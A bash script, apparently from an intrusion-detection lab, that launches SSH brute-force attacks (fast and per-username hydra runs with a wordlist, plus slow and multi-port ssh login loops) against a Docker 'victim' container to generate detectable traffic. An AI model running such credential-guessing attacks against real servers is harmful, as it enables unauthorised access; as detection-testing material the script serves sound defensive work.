#!/usr/bin/env bash
# Run different SSH brute force patterns
# Usage: bash lab/scripts/run_ssh_variants.sh [type]

set -euo pipefail

VICTIM_IP="$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' ids-victim)"
BRUTE_TYPE="${1:-fast}"

echo "[+] SSH attack against ${VICTIM_IP}"

case "$BRUTE_TYPE" in
  fast)
    echo "[*] Fast parallel brute force"
    docker exec ids-attacker hydra -l root -P /opt/wordlist.txt -t 8 -f "ssh://${VICTIM_IP}"
    ;;
  slow)
    echo "[*] Slow brute force (2 seconds between attempts)"
    for i in {1..20}; do
      echo "Attempt $i/20"
      docker exec ids-attacker ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 root@$VICTIM_IP exit 2>/dev/null || true
      sleep 2
    done
    ;;
  distributed)
    echo "[*] Distributed SSH attempts (multiple source ports)"
    for i in {1..5}; do
      docker exec ids-attacker ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 -p $((2200+$i)) root@$VICTIM_IP exit 2>/dev/null &
    done
    wait
    ;;
  user_variants)
    echo "[*] Brute force with different usernames"
    for user in root admin user test oracle mysql postgres; do
      echo "Trying user: $user"
      docker exec ids-attacker hydra -l $user -P /opt/wordlist.txt -t 4 -f "ssh://${VICTIM_IP}" -e n -I 2>/dev/null || true
    done
    ;;
  *)
    echo "Unknown brute type: $BRUTE_TYPE"
    echo "Usage: $0 [fast|slow|distributed|user_variants]"
    exit 1
    ;;
esac

echo "[+] SSH attack complete"
